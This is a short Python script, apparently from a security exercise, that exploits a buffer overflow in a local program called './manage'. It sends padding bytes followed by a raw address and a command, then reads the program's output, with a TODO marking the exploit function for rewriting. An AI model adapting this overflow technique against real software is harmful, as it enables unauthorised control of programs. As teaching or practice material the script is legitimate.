#!/usr/bin/python3
import os, sys
parent_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.append(parent_dir)
from helper import Program


# TODO: Rewrite this function (do not touch anything else).
def exploit():
    prog = Program("./manage")

    for i in range(4):
        print(prog.read_line())
    
    prog.send_line("A" * 17 * 16 + "A" * 9)
    prog.send_line("\x96\x07\x40")
    prog.send_line("E")

    for i in range(3 + 7 * 16 + 5):
        line = prog.read_line()
    print(line)


if __name__ == "__main__":
    exploit()
